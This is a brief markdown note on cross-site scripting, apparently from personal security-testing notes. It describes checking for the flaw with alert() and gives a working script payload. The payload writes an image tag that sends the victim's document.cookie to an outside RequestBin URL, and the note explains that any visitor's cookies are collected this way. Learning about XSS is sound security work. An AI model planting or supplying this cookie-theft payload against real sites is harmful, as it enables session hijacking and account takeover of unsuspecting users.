# XSS

#### Check a basic XSS vuln 
To check a xss vuln, try to input a basic js function somewhere like an ```alert()``` where you *can* like a form or 
an URL.

#### Exploit a basic XSS vuln
Send via the vulnerable input a simple script like this:
```html
<script>
    document.write('<img src=\'https://requestbin.fullcontact.com/xxxxx?cookie='+document.cookie+'\>admin</img>');
</script>
```

RequestBin is a simple service where you can receive information thank to the GET request arguments. We presume that 
when a user will go on the page with our script, it will send the cookie string to the website. 